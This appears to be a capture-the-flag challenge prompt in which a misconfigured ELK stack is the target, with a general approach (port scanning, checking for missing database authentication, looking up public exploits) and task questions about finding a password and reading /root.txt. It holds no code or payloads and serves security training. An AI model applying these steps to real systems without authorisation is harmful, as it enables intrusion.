McDatabaseAdmin has been trying out some new storage technology and came across the ELK stack(consisting of Elastic Search, Kibana and Log Stash). 

The Christmas Monster found this insecurely configured instance and locked McDatabaseAdmin out of it. Can McSkidy help to retrieve the lost data?

While this task does not have supporting material, here is a general approach on how to go about this challenge:

1. scan the machine to look for open ports(specific to services running as well)
2. as with any database enumeration, check if the database requires authentication. If not, enumerate the database to check the tables and records
3. for other open ports, identify misconfigurations or public exploits based on version numbers
```
## Find the password in the database

## Read the contents of the /root.txt file
